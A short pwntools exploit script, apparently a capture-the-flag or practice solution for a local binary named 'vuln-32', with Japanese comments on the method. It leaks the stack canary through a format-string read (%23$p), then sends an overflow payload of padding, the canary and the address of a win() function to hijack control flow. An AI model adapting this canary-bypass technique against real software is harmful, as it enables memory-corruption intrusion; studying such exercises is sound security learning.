from pwn import *

p = process('./vuln-32')

log.info(p.clean())
p.sendline('%23$p')
canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

payload = b'A' * 64
payload += p32(canary)
payload += b'A' * 12
payload += p32(0x08049245)

p.clean()
p.sendline(payload)

print(p.clean().decode('latin-1'))

# linuxのカナリアは00で終わる
# デバッガを使って、buffのアドレスと、そこからカナリアだと思われる場所へのオフセットを考える
# 大体23 - 24バイト程度の場所にあるため
# %23$pとか%24$pとかで実際にその値が出るかを試す
# 実際%23$pだった
# r2でbuffのアドレスと、buffからcanaryのオフセット、canaryからretaddrまでのオフセットを２つ求める
# 一回目のgets()とprintf()で、gets()に%23$pを送り込み、カナリアを手に入れる
# 二回目のgets()では手に入れたカナリアを使って、
# buffからcanaryのオフセット64byte + canary + canaryからretaddrのオフセット12byte + win()関数のアドレス
# こうすることでcanaryをバイパスできる
# pxw @ esp
